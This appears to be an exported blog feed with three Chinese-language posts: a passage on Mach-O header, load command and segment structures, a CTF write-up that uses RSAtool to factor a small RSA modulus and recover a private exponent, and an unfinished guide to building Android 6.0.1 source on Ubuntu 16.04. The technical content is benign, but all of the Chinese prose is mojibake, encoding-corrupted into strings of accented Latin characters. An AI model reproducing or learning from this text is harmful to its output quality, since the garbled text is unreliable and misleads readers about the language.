<li>magicï¼šMachOæ–‡ä»¶çš„é­”æ•°ï¼ŒFATä¸º0xcafebabeï¼ŒARMv7ä½0xfeedfaceï¼ŒARM64ä¸º0xfeedfacfï¼ˆMacæ˜¯å°ç«¯æ¨¡å¼ï¼‰ã€‚</li>
<li>cputypeã€cpusubtypeï¼šCPUæ¶æ„å’Œå­ç‰ˆæœ¬ã€‚</li>
<li>filetypeï¼šæ–‡ä»¶ç±»å‹ã€‚å¸¸è§çš„æœ‰MH_OBJECTï¼ˆç›®æ ‡æ–‡ä»¶ï¼‰ã€MH_EXECUTABLEï¼ˆå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ã€MH_DYLIBï¼ˆåŠ¨æ€åº“ï¼‰ã€‚</li>
<li>mcmdsï¼šåŠ è½½å‘½ä»¤çš„æ•°é‡ã€‚</li>
<li>sizeofcmsï¼šæ‰€æœ‰åŠ è½½å‘½ä»¤çš„å¤§å°</li>
<li>flagsï¼šdyldåŠ è½½éœ€è¦ä¸€äº›æ ‡è®°ã€‚å…¶ä¸­ï¼ŒMH_PIEè¡¨ç¤ºå¯ç”¨åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ã€‚</li>
<li>reservedï¼š64ä½çš„ä¿ç•™å­—æ®µã€‚</li>
</ul>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/MachO3.jpg" alt=""></p>
<h1 id="Load-Command"><a href="#Load-Command" class="headerlink" title="Load Command"></a>Load Command</h1><p>load Commandç”¨äºå‘Šè¯‰æ“ä½œç³»ç»Ÿåº”å½“å¦‚ä½•åŠ è½½æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œå¯¹ç³»ç»Ÿå†…æ ¸åŠ è½½å™¨å’ŒåŠ¨æ€é“¾æ¥å™¨èµ·æŒ‡å¯¼ä½œç”¨ã€‚<br>load CommandåŒ…å«ä»¥ä¸‹éƒ¨åˆ†:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_SEGMENT_64				å®šä¹‰ä¸€ä¸ªæ®µï¼ŒåŠ è½½åè¢«æ˜ å°„åˆ°å†…å­˜ä¸­ï¼ŒåŒ…æ‹¬é‡Œé¢çš„èŠ‚</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_SYMTAB					ä¸ºæ–‡ä»¶å®šä¹‰ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_DYSYMTAB				  å°†ç¬¦å·è¡¨ä¸­ç»™å‡ºç¬¦å·çš„é¢å¤–ç¬¦å·ä¿¡æ¯æä¾›ç»™åŠ¨æ€é“¾æ¥å™¨</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_LOAD_DYLIB				ä¾èµ–çš„åŠ¨æ€åº“ï¼ŒåŒ…æ‹¬åŠ¨æ€åº“åç§°ã€å½“å‰ç‰ˆæœ¬å·ç­‰ç­‰</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_LOAD_DYLINKER 			é»˜è®¤åŠ è½½å™¨è·¯å¾„</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_UUID					  ç”¨äºè¡¨ç¤ºMachOæ–‡ä»¶çš„ID</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_RPATH         		    rpathæœç´¢çš„è·¯å¾„</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_ENCRYPTION_INFO_64 	   æ–‡ä»¶æ˜¯å¦åŠ å¯†çš„æ ‡å¿—ï¼ŒåŠ å¯†å†…å®¹çš„åç§»å’Œå¤§å°</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_DYLD_INFO_ONLY 		   è®°å½•äº†æœ‰å…³é“¾æ¥çš„é‡è¦ä¿¡æ¯ï¼ŒåŒ…æ‹¬__LINKEDITä¸­åŠ¨æ€é“¾æ¥ç›¸å…³ä¿¡æ¯çš„åç§»å’Œå¤§å°ã€‚</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_VERSION_MIN_IPHONEOS      ç³»ç»Ÿè¦æ±‚æœ€ä½ç‰ˆæœ¬</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_FUNCTION_STARTS  		 å‡½æ•°èµ·å§‹åœ°å€è¡¨</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_MAIN 					 ç¨‹åºå…¥å£ï¼Œdyldè·å–æ”¹åœ°å€ç„¶åè·³è½¬åˆ°è¯¥å¤„æ‰§è¡Œ</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_DATA_IN_CODE  		    å®šä¹‰åœ¨ä»£ç æ®µå†…çš„éæŒ‡ä»¤çš„è¡¨</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_SOURCE_VERSION  		  æ„å»ºäºŒè¿›åˆ¶æ–‡ä»¶çš„æºä»£ç ç‰ˆæœ¬å·</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>	LC_DYLIB_CODE_SIGN_DRS       ä»£ç ç­¾åä¿¡æ¯</span></div></pre></td></tr></table></figure>
<p>LC_SEGMENT_64å®šä¹‰äº†ä¸€ä¸ª64ä½çš„æ®µï¼Œå½“æ–‡ä»¶åŠ è½½åæ˜ å°„åˆ°åœ°å€ç©ºé—´ï¼Œ64ä½æ®µçš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">struct</span> segment_command_64 &#123; <span class="comment">/* for 64-bit architectures */</span></div><div class="line">    <span class="keyword">uint32_t</span>   cmd;         <span class="comment">/* LC_SEGMENT_64 */</span></div><div class="line">    <span class="keyword">uint32_t</span>   cmdsize;     <span class="comment">/* includes sizeof section_64 structs */</span></div><div class="line">    <span class="keyword">char</span>       segname[<span class="number">16</span>]; <span class="comment">/* segment name */</span></div><div class="line">    <span class="keyword">uint64_t</span>   vmaddr;      <span class="comment">/* memory address of this segment */</span></div><div class="line">    <span class="keyword">uint64_t</span>   vmsize;      <span class="comment">/* memory size of this segment */</span></div><div class="line">    <span class="keyword">uint64_t</span>   fileoff;     <span class="comment">/* file offset of this segment */</span></div><div class="line">    <span class="keyword">uint64_t</span>   filesize;    <span class="comment">/* amount to map from the file */</span></div><div class="line">    <span class="keyword">vm_prot_t</span>  maxprot;     <span class="comment">/* maximum VM protection */</span></div><div class="line">    <span class="keyword">vm_prot_t</span>  initprot;    <span class="comment">/* initial VM protection */</span></div><div class="line">    <span class="keyword">uint32_t</span>   nsects;      <span class="comment">/* number of sections in segment */</span></div><div class="line">    <span class="keyword">uint32_t</span>   flags;       <span class="comment">/* flags */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>ç³»ç»Ÿå°†fileoffåç§»å¤„çš„filesizeå¤§å°çš„å†…å®¹åŠ è½½åˆ°è™šæ‹Ÿå†…å­˜çš„vmaddrï¼Œå¤§å°ä¸ºvmsizeï¼Œvmsize å¹¶ä¸ç­‰äº filesizeï¼Œå¯¹äº 4KB å¤§å°çš„ VPï¼Œvmsize æ˜¯ 4K çš„å€æ•°ï¼›æ¢å¥è¯è¯´ï¼Œvmsize ä¸€èˆ¬å¤§äº segment çš„å®é™…å¤§å°ã€‚<br>ç«¯é¡µé¢çš„æƒé™ç”±initportè¿›è¡Œåˆå§‹åŒ–ã€‚ä½†æ˜¯ä¸èƒ½è¶…è¿‡ maxprot ä¸­æŒ‡å®šçš„å€¼ã€‚<br>æ–‡ä»¶ä¸­ä¸»è¦åŒ…æ‹¬<strong>PAGEZEROã€</strong>TEXTã€<strong>DATAã€</strong>LINKEDITå››ç§æ®µï¼Œæ®µé‡Œå¯ä»¥åŒ…æ‹¬ä¸åŒçš„èŠ‚ã€‚å®šä¹‰å¦‚ä¸‹ï¼š<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">struct</span> section_64 &#123; <span class="comment">/* for 64-bit architectures */</span></div><div class="line">    <span class="keyword">char</span>      sectname[<span class="number">16</span>];    <span class="comment">/* name of this section */</span></div><div class="line">    <span class="keyword">char</span>      segname[<span class="number">16</span>];     <span class="comment">/* segment this section goes in */</span></div><div class="line">    <span class="keyword">uint64_t</span>  addr;            <span class="comment">/* memory address of this section */</span></div><div class="line">    <span class="keyword">uint64_t</span>  size;            <span class="comment">/* size in bytes of this section */</span></div><div class="line">    <span class="keyword">uint32_t</span>  offset;          <span class="comment">/* file offset of this section */</span></div><div class="line">    <span class="keyword">uint32_t</span>  align;           <span class="comment">/* section alignment (power of 2) */</span></div><div class="line">    <span class="keyword">uint32_t</span>  reloff;          <span class="comment">/* file offset of relocation entries */</span></div><div class="line">    <span class="keyword">uint32_t</span>  nreloc;          <span class="comment">/* number of relocation entries */</span></div><div class="line">    <span class="keyword">uint32_t</span>  flags;           <span class="comment">/* flags (section type and attributes)*/</span></div><div class="line">    <span class="keyword">uint32_t</span>  reserved1;       <span class="comment">/* reserved (for offset or index) */</span></div><div class="line">    <span class="keyword">uint32_t</span>  reserved2;       <span class="comment">/* reserved (for count or sizeof) */</span></div><div class="line">    <span class="keyword">uint32_t</span>  reserved3;       <span class="comment">/* reserved */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>ç»“æ„ä½“section_64å¯ä»¥çœ‹åš section headerï¼Œå®ƒæè¿°äº†å¯¹åº” section çš„å…·ä½“ä½ç½®ï¼Œä»¥åŠè¦è¢«æ˜ å°„çš„ç›®æ ‡è™šæ‹Ÿåœ°å€ã€‚<br>å›å¤´å†çœ‹segment_command_64çš„cmdsizeå­—æ®µï¼Œå®ƒçš„æ•°å€¼å¹¶éæ˜¯segment_command_64çš„ size å¤§å°ï¼Œè¿˜åŒ…æ‹¬äº†ç´§æ¥åœ¨ command åé¢çš„æ‰€æœ‰section_64ç»“æ„ä½“çš„å¤§å°ã€‚<br>å¦‚æœ segment å«æœ‰ 5 ä¸ª sectionï¼Œé‚£ä¹ˆå¯¹åº”çš„ segment_command_64 çš„ cmdsize å€¼ä¸ºï¼š72ï¼ˆsegment_command_64æœ¬èº«å¤§å°ï¼‰ + 5 * 80ï¼ˆsection_64çš„å¤§å°ï¼‰ = 472 bytes</p>
<h1 id="TEXTæ®µå’Œ-DATAæ®µ"><a href="#TEXTæ®µå’Œ-DATAæ®µ" class="headerlink" title="_TEXTæ®µå’Œ_DATAæ®µ"></a>_TEXTæ®µå’Œ_DATAæ®µ</h1><h2 id="TEXT"><a href="#TEXT" class="headerlink" title="_TEXT"></a>_TEXT</h2><p>_TEXTæ®µåŒ…å«äº†å¤šä¸ªèŠ‚åŒºï¼Œå„åŒºçš„ä½œç”¨å¦‚ä¸‹ï¼š</p>
<ul>
<li>_textèŠ‚æ˜¯ä¸»ç¨‹åºä»£ç </li>
<li>_picsymbolstub4èŠ‚å’Œ__syub_helperèŠ‚ç”¨äºåŠ¨æ€é“¾æ¥</li>
<li>_cstringæ˜¯ä»£ç é‡Œç”¨åˆ°çš„å­—ç¬¦ä¸²è¡¨</li>
<li>_objc_classnameæ˜¯objcç±»æ–¹æ³•å</li>
<li>_objc_methnameæ˜¯objcçš„æ–¹æ³•åç§°</li>
<li>_objc_methtypeæ˜¯objcçš„æ–¹æ³•ç±»å‹</li>
<li>_constæ˜¯ç”±constä¿®é¥°çš„å¸¸é‡</li>
</ul>
<h2 id="DATA"><a href="#DATA" class="headerlink" title="_DATA"></a>_DATA</h2><p>_DATAæ˜¯æ•°æ®æ®µï¼Œé‡Œé¢ä¸»è¦å­˜æ”¾æ•°æ®ï¼Œå¯è¯»å¯å†™ä¸å¯æ‰§è¡Œï¼Œéƒ¨åˆ†èŠ‚åŒºä½œç”¨å¦‚ä¸‹ï¼š</p>
<ul>
<li>_gotéæ‡’åŠ è½½å…¨å±€æŒ‡é’ˆè¡¨</li>
<li>_la_symbol_ptræ‡’åŠ è½½æŒ‡é’ˆè¡¨</li>
<li>_cftringä½¿ç”¨çš„å­—ç¬¦ä¸²ä¿¡æ¯</li>
<li>_objc_classlistç¨‹åºä¸­ç±»åˆ—è¡¨</li>
<li>_objc_protolistç¨‹åºä¸­åè®®åˆ—è¡¨</li>
<li>_objc_imageinfoç¨‹åºä¸­é•œåƒä¿¡æ¯</li>
<li>_objc_constæ˜¯objcå¸¸é‡</li>
<li>_objc_superrefsæ˜¯objcè¶…ç±»å¼•ç”¨</li>
<li>_objc_ivaræ˜¯objcç±»çš„å®ä¾‹å˜é‡</li>
</ul>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä»¥ä¸Šæ˜¯é’ˆå¯¹MachOæ–‡ä»¶ç»“æ„çš„ç®€å•æ€»ç»“ï¼Œä¸ºäº†æ›´åŠ å½¢è±¡çš„äº†è§£MachOæ–‡ä»¶ç»“æ„åŠå…¶åœ¨ç¨‹åºè¿è¡Œä¸­çš„è¿ç”¨ï¼Œä¸‹ä¸€èŠ‚é€šè¿‡fishhookã€class-dumpç­‰å·¥å…·çš„åŸç†æ·±å…¥äº†è§£MachOçš„å·¥ä½œåŸç†ã€‚</p>
]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>MachO</tag>
      </tags>
  </entry>
  <entry>
    <title>RSAtoolä½¿ç”¨æ–¹æ³•</title>
    <url>/2016/08/19/RSAtools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>æœ€è¿‘åœ¨åšCTFçš„æ—¶å€™é‡åˆ°å‡ é“RSAçš„è§£å¯†é¢˜ç›®ï¼Œç½‘ä¸Šä»‹ç»äº†RSAtoolè¿™æ¬¾å·¥å…·ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†ä¸€éƒ¨åˆ†èµ„æ–™ï¼Œä¹Ÿæ²¡æœ‰ç›¸å…³çš„ä½¿ç”¨æ–¹æ³•ï¼Œè‡ªå·±æ€»ç»“äº†ä¸€ä¸‹ï¼Œå†™ä¸‹æ¥å’Œå¤§å®¶ä¸€èµ·åˆ†äº«ã€‚<br><a id="more"></a><br>RSAtoolæ˜¯ä¸€ä¸ªéå¸¸æ–¹ä¾¿å®ç”¨çš„å°å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥è®¡ç®—RSAä¸­çš„å‡ ä¸ªå‚æ•°ã€ç”Ÿæˆå¯†é’¥ã€åŠ è§£å¯†ï¼Œä¸€äº›ä¸å¤ªå¤æ‚çš„ç ´è§£å·¥ä½œä¹Ÿå¯ä»¥ç”¨å®ƒã€‚</p>
<p>è¿™é‡Œå°±ä¸åœ¨RSAç®—æ³•ä¸Šå¤šåšç ”ç©¶äº†ï¼Œç›´æ¥é€šè¿‡ä¸¤ä¸ªCTFä¾‹å­ç›´è§‚ä½“ç°å§ã€‚</p>
<h2 id="ä¾‹ä¸€"><a href="#ä¾‹ä¸€" class="headerlink" title="ä¾‹ä¸€"></a>ä¾‹ä¸€</h2><pre><code>è¿˜è®°å¾—veryeasy RSAå—ï¼Ÿæ˜¯ä¸æ˜¯ä¸éš¾ï¼Ÿé‚£ç»§ç»­æ¥çœ‹çœ‹è¿™é¢˜å§ï¼Œè¿™é¢˜ä¹Ÿä¸éš¾ã€‚
å·²çŸ¥ä¸€æ®µRSAåŠ å¯†çš„ä¿¡æ¯ä¸ºï¼š0xdc2eeeb2782cä¸”å·²çŸ¥åŠ å¯†æ‰€ç”¨çš„å…¬é’¥ï¼š
(N=322831561921859 e = 23)
è¯·è§£å¯†å‡ºæ˜æ–‡ï¼Œæäº¤æ—¶è¯·å°†æ•°å­—è½¬åŒ–ä¸ºasciiç æäº¤
æ¯”å¦‚ä½ è§£å‡ºçš„æ˜æ–‡æ˜¯0x6162ï¼Œé‚£ä¹ˆè¯·æäº¤å­—ç¬¦ä¸²ab
æäº¤æ ¼å¼:PCTF{æ˜æ–‡å­—ç¬¦ä¸²}
</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools4.png" alt=""></p>
<p>å›¾ä¸­çš„Pã€Qã€Rã€Dã€Eåˆ†åˆ«å°±æ˜¯RSAç®—æ³•ä¸­çš„pã€qã€Nã€dã€eï¼Œå³ä¸Šè§’é€‰æ‹©è¿›åˆ¶ï¼Œæ³¨æ„ä¸è¦å¼„é”™ï¼Œeåªæœ‰åå…­è¿›åˆ¶å¯ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œè¦æŠŠ23æ¢æˆ17ã€‚</p>
<p>å°†N=322831561921859å¡«å…¥ï¼Œå·¦ä¸‹è§’æœ‰ä¸€ä¸ªFactor Nçš„æŒ‰é’®ï¼Œè¿™æ˜¯åˆ†è§£Nçš„æ„æ€ï¼Œç‚¹ä¸€ä¸‹ï¼Œä¼šè‡ªåŠ¨å¼€å§‹åˆ†è§£å› æ•°ï¼Œå¾—åˆ°P=13574881ã€Q=23781539ï¼Œå†ç‚¹ä¸€ä¸‹Calc. Dï¼Œè®¡ç®—å‡ºd=42108459725927ï¼Œè¿™æ—¶å¯ä»¥çœ‹åˆ°TestæŒ‰é’®ä¸å†æ˜¯ç°è‰²ï¼Œè¡¨æ˜å¯ä»¥ä½¿ç”¨ç®€å•çš„åŠ è§£å¯†åŠŸèƒ½ï¼Œç‚¹å®ƒï¼Œå¼¹å‡ºä¸€ä¸ªæ¡†ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools3.png" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools2.png" alt=""></p>
<p>ç¬¬ä¸€ä¸ªæ¡†æ˜¯æ˜æ–‡ï¼Œç¬¬äºŒä¸ªæ¡†æ˜¯å¯†æ–‡ï¼Œè¾“å…¥æ˜æ–‡123456ï¼Œç‚¹å‡»Encryptï¼Œå¾—åˆ°å¯†æ–‡1464305227134ï¼Œè¿™æ—¶å°±å¯ä»¥ä½¿ç”¨è§£å¯†åŠŸèƒ½ï¼ˆå¥½åƒå¿…é¡»å…ˆç”¨ä¸€æ¬¡åŠ å¯†æ‰è¡Œï¼‰ã€‚</p>
<p>å¯†æ–‡0xdc2eeeb2782cï¼Œæ¢ç®—åè¿›åˆ¶242094131279916ï¼Œç‚¹Decryptï¼Œç›´æ¥å¾—åˆ°å­—ç¬¦ä¸²3a5Yã€‚</p>
<h2 id="ä¾‹äºŒ"><a href="#ä¾‹äºŒ" class="headerlink" title="ä¾‹äºŒ"></a>ä¾‹äºŒ</h2><pre><code>å·²çŸ¥RSAå…¬é’¥ç”Ÿæˆå‚æ•°ï¼š
p = 3487583947589437589237958723892346254777 
q = 8767867843568934765983476584376578389
e = 65537
æ±‚d = 
è¯·æäº¤PCTF{d}
</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools1.png" alt=""></p>
<p>ç›´æ¥å°†pï¼Œqå¡«å…¥ï¼Œå°†eçš„å€¼65537è½¬æ¢æˆ10è¿›åˆ¶10001ï¼Œä¹‹åè®¡ç®—dçš„å€¼å°±å¯ä»¥äº†ã€‚</p>
]]></content>
      <tags>
        <tag>å¯†ç å­¦</tag>
        <tag>å·¥å…·</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu16.04ç¼–è¯‘Androidæºç </title>
    <url>/2021/06/17/Ubuntu16-04%E7%BC%96%E8%AF%91Android%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<p>å¾ˆä¹…ä¹‹å‰å°±æƒ³è¦ç¼–è¯‘Androidæºç ï¼Œè¿™æ¬¡ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹ï¼Œé‡åˆ°äº†å¾ˆå¤šçš„å‘ä¹Ÿå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œè¿™é‡Œåšä¸€äº›è®°å½•ï¼Œæ–¹ä¾¿ä¹‹åçš„ç¼–è¯‘ï¼ŒåŒäº‹åœ¨é‡åˆ°æ–°çš„é—®é¢˜çš„æ—¶å€™ä¼šä¸å®šæ—¶åœ¨æ­¤ç¯‡æ–‡ç« ä¸­æ›´æ–°ã€‚<br><a id="more"></a></p>
<h2 id="Macä¸‹è½½ç¼–è¯‘è¸©å‘"><a href="#Macä¸‹è½½ç¼–è¯‘è¸©å‘" class="headerlink" title="Macä¸‹è½½ç¼–è¯‘è¸©å‘"></a>Macä¸‹è½½ç¼–è¯‘è¸©å‘</h2><p>åœ¨ç”¨Ubuntuç¼–è¯‘Androidæºç ä¹‹å‰ï¼ŒåŸæœ¬æ˜¯å‡†å¤‡ä½¿ç”¨Macè¯•è¯•çš„ï¼Œç»“æœæ‘”çš„å¾ˆæƒ¨ã€‚</p>
<p><strong>ä¸è¦ç”¨é«˜ç‰ˆæœ¬çš„MACã€XCODEç¼–è¯‘ä½ç‰ˆæœ¬çš„ANDROIDæºç ï¼ï¼ï¼</strong></p>
<p>å¦‚æœä¸æ˜¯æœ‰å¾ˆå¤šæ—¶é—´å»æµªè´¹ï¼Œæˆ–è€…ä¸“é—¨å»ç ”ç©¶Macç¼–è¯‘Androidæºç ï¼Œå¦åˆ™ä¸å»ºè®®ä½¿ç”¨é«˜ç‰ˆæœ¬MacOSç³»ç»Ÿ+XcodeSDKå»ç¼–è¯‘ä½ç‰ˆæœ¬æºç ï¼Œè¿™é‡Œå¹¶ä¸æ˜¯è¯´æ— æ³•ç¼–è¯‘ï¼Œè€Œæ˜¯è¯´ä¼šé‡åˆ°æ•°ä¸æ¸…çš„é—®é¢˜ï¼Œæœ€å¥½æ˜¯æ‰¾ç½‘ä¸Šå…¶ä»–äººç¼–è¯‘æˆåŠŸçš„ç‰ˆæœ¬å»å°è¯•ã€‚æœ¬äººå‡†å¤‡æœ‰æ—¶é—´å¯ä»¥å†æ¬¡å»æŒ‘æˆ˜ä¸€ä¸‹ã€‚æˆåŠŸä¹‹åå¯ä»¥åœ¨æ­¤è¡¥å……ã€‚</p>
<h2 id="ç¼–è¯‘ç¯å¢ƒ"><a href="#ç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="ç¼–è¯‘ç¯å¢ƒ"></a>ç¼–è¯‘ç¯å¢ƒ</h2><pre><code>Ubuntu16.04
Android 6.0.1_r1
</code></pre><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>è¿™é‡Œå¦‚ä½•ä¸‹è½½å®‰è£…Ubuntuè™šæ‹Ÿæœºå°±ä¸åœ¨ä¸€ä¸€é˜è¿°äº†ï¼Œæœ¬æ¬¡æµ‹è¯•æ˜¯åœ¨Macä¸­å®‰è£…VMware Fusion 12ç„¶åå®‰è£…Ubuntu16.04è™šæ‹Ÿæœºä¸­è¿›è¡Œã€‚</p>
<p><strong>å‡†å¤‡ä¸€ä¸ªå¥½ç”¨çš„æ¢¯å­</strong></p>
<p>ç½‘ä¸Šå¾ˆå¤šæ–‡ç« åœ¨ä¸‹è½½æºç è¿‡ç¨‹ä¸­å»ºè®®ä½¿ç”¨æ¸…åæºä¹‹ç±»çš„å›½å†…æºä¸‹è½½ï¼Œæˆ‘å°è¯•è¿‡ä½“éªŒå¾ˆå·®ï¼Œä¸‹è½½éœ€è¦å¾ˆé•¿æ—¶é—´ä¸è¯´ï¼Œå¾ˆå¤šæ–‡ä»¶ä¸€æ¬¡è¿˜ä¸‹è½½ä¸ä¸‹æ¥ï¼Œæ¢æˆå®˜æ–¹æºï¼Œç§‘å­¦ä¸Šç½‘ä¹‹åå¾ˆå¿«ä¾¿å°†æºç ä¸‹è½½ä¸‹æ¥äº†ï¼Œä¸ä¼šæœ‰å…¶ä»–é—®é¢˜ã€‚</p>
<p><strong>è™šæ‹Ÿæœºç©ºé—´ä¸€å®šè¦åˆ†é…çš„è¶³å¤Ÿå¤§</strong></p>
<p>Androidæºç ä¸‹è½½ç¼–è¯‘æ‰€éœ€çš„ç‰©ç†å†…å­˜æ˜¯å¾ˆå¤§çš„ï¼Œ300Gæ˜¯ä¸ªæ¯”è¾ƒç¨³å¦¥çš„å¤§å°ï¼Œå»ºè®®æœ‰è¶³å¤Ÿçš„ç©ºé—´çš„æœ‹å‹å¯ä»¥è€ƒè™‘è¿›è¡Œæ‰©å®¹åˆ°æ­¤å¤§å°ã€‚</p>
<p>VMware Fusion12å¦‚ä½•æ‰©å®¹å¦‚ä¸‹ï¼š</p>
<p><a href="https://blog.csdn.net/zsx1314lovezyf/article/details/105445554" target="_blank" rel="external">https://blog.csdn.net/zsx1314lovezyf/article/details/105445554</a></p>
<h2 id="æºç ä¸‹è½½"><a href="#æºç ä¸‹è½½" class="headerlink" title="æºç ä¸‹è½½"></a>æºç ä¸‹è½½</h2><h3 id="ä¸‹è½½git"><a href="#ä¸‹è½½git" class="headerlink" title="ä¸‹è½½git"></a>ä¸‹è½½git</h3><p>Googleé‡‡ç”¨Gitå¯¹AOSPé¡¹ç›®è¿›è¡Œå¤šä»“åº“ç®¡ç†ï¼Œæ‰€ä»¥éœ€è¦å…ˆå®‰è£…git</p>
<pre><code>sudo apt-get install git 
git config --global user.email â€œxxxxxx@qq.comâ€ 
git config --global user.name â€œxxxxxxâ€
</code></pre><h3 id="ä¸‹è½½repo"><a href="#ä¸‹è½½repo" class="headerlink" title="ä¸‹è½½repo"></a>ä¸‹è½½repo</h3><pre><code>mkdir ~/bin
PATH=~/bin:$PATH
curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo
chmod a+x ~/bin/repo
</code></pre><p>æ–°å»ºå·¥ä½œç›®å½•</p>
<pre><code>mkdir Android_source
cd Android_source
</code></pre><p>åˆå§‹åŒ–ä»“åº“</p>
<pre><code>repo init -u https://android.googlesource.com/platform/manifest -b android-6.0.1_r1
</code></pre><p>å¦‚æœæ²¡æœ‰æ¢¯å­çš„è¯ï¼Œå°±ä½¿ç”¨å›½å†…é•œåƒ<br>    repo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-6.0.1_r62</p>
<pre><code>## å¦‚æœæç¤ºæ— æ³•è¿æ¥åˆ° gerrit.googlesource.comï¼Œå¯ä»¥ç¼–è¾‘ ~/bin/repoï¼ŒæŠŠ REPO_URL ä¸€è¡Œæ›¿æ¢æˆä¸‹é¢çš„ï¼š
## REPO_URL = &apos;https://gerrit-googlesource.proxy.ustclug.org/git-repo&apos;
</code></pre><p>æ¥ä¸‹æ¥åŒæ­¥æºç æ ‘</p>
<pre><code>repo sync
</code></pre><p>æ¼«é•¿çš„ç­‰å¾…ï¼Œä¸‹è½½è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜ä¸€èˆ¬éƒ½æ˜¯å› ä¸ºæ²¡æœ‰ä½¿ç”¨ç§‘å­¦ä¸Šç½‘æˆ–è€…ç½‘é€Ÿçš„é—®é¢˜ï¼Œä½™é¢ä¸è¶³è¯·å……å€¼ï¼ï¼ï¼</p>
<p>åˆ é™¤.repo<br>ä¸‹è½½å®Œæºç åï¼Œä¼šå‘ç°ä»£ç æœ‰50å¤šG å…¶ä¸­æœ‰ä¸ªéšè—æ–‡ä»¶å¤¹.repo ä»–è‡ªå·±å°±æœ‰40å¤šG ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹åªè·Ÿä»£ç åŒæ­¥æœ‰å…³ï¼Œå¹¶ä¸å½±å“ç¼–è¯‘ï¼Œæœæ–­åˆ é™¤ï¼Œåˆ é™¤åæºç åªæœ‰7G ï¼Œå¯ä»¥å¤‡ä»½ä¸‹æºç </p>
<h2 id="ç¼–è¯‘ç¯å¢ƒé…ç½®"><a href="#ç¼–è¯‘ç¯å¢ƒé…ç½®" class="headerlink" title="ç¼–è¯‘ç¯å¢ƒé…ç½®"></a>ç¼–è¯‘ç¯å¢ƒé…ç½®</h2><h3 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h3><pre><code>sudo apt-get install -y git flex bison gperf build-essential libncurses5-dev:i386 \
libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-dev g++-multilib \
tofrodos python-markdown libxml2-utils xsltproc \
zlib1g-dev:i386 dpkg-dev libsdl1.2-dev libesd0-dev \
git-core gnupg zip curl zlib1g-dev gcc-multilib \
libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev \
libx11-dev lib32z-dev ccache u3nzip m4
</code></pre><h3 id="å®‰è£…-openJDK7"><a href="#å®‰è£…-openJDK7" class="headerlink" title="å®‰è£… openJDK7"></a>å®‰è£… openJDK7</h3><p>Ubuntu16.04æ²¡æœ‰open JDK7çš„æºï¼Œå¢åŠ ä¸ªä»“åº“æº</p>
<pre><code>sudo add-apt-repository ppa:openjdk-r/ppa 
sudo apt-get update
sudo apt-get install openjdk-7-jdk
</code></pre><p>å®‰è£…åç¯å¢ƒå˜é‡å·²ç»é…ç½®å¥½ï¼Œjava -versionæŸ¥çœ‹ï¼Œä¸Šè¿°æ–¹æ³•æ˜¯ç½‘ç»œä¸Šå‡ºç°æœ€å¤šçš„æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘è‡ªå·±å°è¯•çš„å¤±è´¥çš„ï¼Œå¦‚æœä»ç„¶å¤±è´¥ï¼Œå¯ä»¥é€šè¿‡ç›´æ¥ä¸‹è½½å…¶ä»–äººä¸‹è½½å¥½çš„å®‰è£…åŒ…ï¼Œç„¶åè§£å‹æ–‡ä»¶</p>
<pre><code>sudo tar -zxvf  java-7-openjdk-amd64.tar.gz -C /usr/lib/jvm/
